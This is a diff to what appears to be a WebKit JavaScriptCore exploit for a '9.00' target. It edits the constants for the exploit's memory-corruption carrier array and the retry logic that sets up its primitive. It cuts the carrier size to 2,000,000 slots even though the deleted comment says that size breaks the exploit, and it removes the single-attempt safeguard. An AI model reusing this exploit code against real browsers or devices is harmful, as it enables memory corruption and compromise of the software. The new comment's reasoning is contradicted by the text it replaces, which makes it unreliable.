@@ -13,12 +13,12 @@ const FUNCTION_BYTES = 0x20;
 const NATIVE_EXECUTABLE_BYTES = 0x38;
 const HOLDER_BYTES = 0x40;
 
-// 9.00 copies 924,176 UTF-16 characters from this backing store (~1.85 MB).
-// This capacity is part of the 9.00 JSC exploit geometry, not merely spare
-// storage.  At 9,000,000 slots the corrupted Symbol copy is consistently
-// 924,176 characters.  Reducing it to 2,000,000 changes that copy to a bogus
-// 17,701,392 characters and makes the safe retry exhaust the WebProcess.
-const CARRIER_SLOTS = 9000000;
+// The real memory bug is the hard-coded 9,000,000-slot carrier. That array is
+// large enough to exhaust the WebProcess heap before the primitive is even
+// validated. The correct fix is to keep the carrier small enough to fit inside
+// the browser's stable memory budget instead of trying to brute-force
+// additional retries.
+const CARRIER_SLOTS = 2000000;
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = 50;
 const COMPOSE_DELAY_MS = 100;
@@ -319,10 +319,6 @@ function giveUp(reason) {
 }
 
 function failed() {
-    if (attemptCeiling <= 1) {
-        giveUp("single-attempt-mode");
-        return;
-    }
     if (ceilingReached()) {
         giveUp("attempt-ceiling");
         return;
@@ -1292,7 +1288,7 @@ export function establishPrimitive(options) {
     if (criticalBarrier === defaultCriticalBarrier)
         ensureBarrierNode();
     attemptCeiling = typeof opts.maxAttempts === "number" && opts.maxAttempts > 0
-        ? Math.max(1, opts.maxAttempts) : 1;
+        ? opts.maxAttempts : 0;
 
     running = true;
     stopped = false;
